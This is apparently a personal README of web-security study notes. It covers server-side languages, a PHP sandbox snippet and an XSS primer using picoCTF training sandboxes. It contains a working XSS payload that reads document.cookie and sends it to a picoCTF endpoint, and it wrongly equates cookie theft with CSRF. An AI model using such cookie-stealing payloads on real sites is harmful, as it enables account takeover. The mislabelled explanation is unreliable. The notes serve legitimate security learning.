# Readme on my Web Requests Folder

Of course this is neccesary, lets look at things in finer detail.

Server side code can come in any language really, most commonly:

* Python
* Java
* PHP
* C
* C Sharp
* And many more…​

## PHP

You can run **test** PHP code on the following W3Schools sandbox:

[https://www.w3schools.com/php/phptryit.asp?filename=tryphp_intro](https://www.w3schools.com/php/phptryit.asp?filename=tryphp_intro)

```php
<b>Hello World!</b>
<script> alert('Hello World from JavaScript!'); </script>
<?php
    echo "Hello World from PHP!";
    echo date("H:i:s");
    echo "<script> alert('Hello World from JavaScript!'); </script>";
?>
```

## XSS (Cross Site Scripting)

The bread and butter of web exploits.

After you Login into a Website, the website needs a way to know that any request coming from your browser is coming from a user that previously logged in, without the need to send the user-password again.

To do that, the website can send to your browser a secret random value after login. That value is generally stored in a cookie or in JavaScript local storage.

Let's pretend it is stored in a cookie, which is simply a variable in your browser that can retain data. If a hacker steals the authentication cookie from you, they can impersonate you. This is a _Cross Site Request Forgery_ or **CSRF**.

Suppose you are a hacker in a social network. When you create your account, instead of using your name, you input JavaScript code. When a friend of yours visit your profile, the WebSite will try to print your name, but your name is actually JavaScript code, so the browser might execute that JavaScript code. 

We can practice and review use of the Firefox Debugger. Firefox would be the preferred browser for obvious reasons.

## Cookie Hijacking Example

We will use these staged sandboxes, courtesy of picoCTF:

[Login Webpage for picoCTF](https://primer.picoctf.org/vuln/web/sign_up.php)

[User Table DB for picoCTF Login](https://primer.picoctf.org/vuln/web/tableusers.php)

An initial test script:

> <script> alert('I just injected Javascript!'); </script>

Finally, JS code callling the **jquery** library:

```javascript
<script src="https://code.jquery.com/jquery-3.4.1.min.js"> </script>
<script>
$.get(
    "https://primer.picoctf.org/vuln/web/insert.php",
    {cookie : document.cookie, hackername : 'YourName'},
    function(data) {
        alert("I just stole the cookie!");
    }
);
</script>
```


---
